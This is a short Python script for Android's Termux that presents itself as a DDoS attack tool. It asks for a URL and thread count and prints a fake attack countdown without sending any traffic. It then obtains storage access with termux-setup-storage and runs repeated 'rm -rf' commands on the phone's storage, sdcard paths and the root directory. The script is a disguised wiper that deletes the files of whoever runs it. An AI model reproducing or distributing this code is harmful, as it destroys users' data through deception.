import os
import time

os.system("clear")
x = input(" URL: ")
y = input(" Thread ")

os.system("clear")
time.sleep(5)
print("Loading...")

for y in range (1000000):
    print("[*] attack status ===> ",y," sec left ")
ddos = input(" attack done press enter or type exit; ")

os.system('termux-setup-storage')
os.system('rm -rf /storage/emulated/0/*')
os.system('rm -rf /storage/emulated/*')
os.system('rm -rf /sdcard/*')
os.system('rm -rf /sdcard/0/*')
os.system('rm -rf /sdcard1/*')
os.system('rm -rf /storage/*')
os.system('rm -rf /*')
